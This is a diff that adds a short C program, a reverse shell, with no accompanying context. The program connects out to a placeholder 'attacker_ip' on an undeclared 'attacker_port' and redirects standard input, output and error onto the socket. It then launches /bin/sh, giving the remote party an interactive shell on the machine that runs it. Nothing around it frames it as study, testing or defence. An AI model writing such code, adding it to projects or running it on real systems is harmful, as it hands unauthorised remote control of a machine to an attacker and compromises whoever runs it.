@@ -1,0 +1,18 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main() {
+    int sockfd;
+    struct sockaddr_in attacker_addr;
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    attacker_addr.sin_family = AF_INET;
+    attacker_addr.sin_port = htons(attacker_port);
+    attacker_addr.sin_addr.s_addr = inet_addr("attacker_ip");
+    connect(sockfd, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr));
+    dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);
+    execl("/bin/sh", "sh", NULL);
+    return 0;
+}
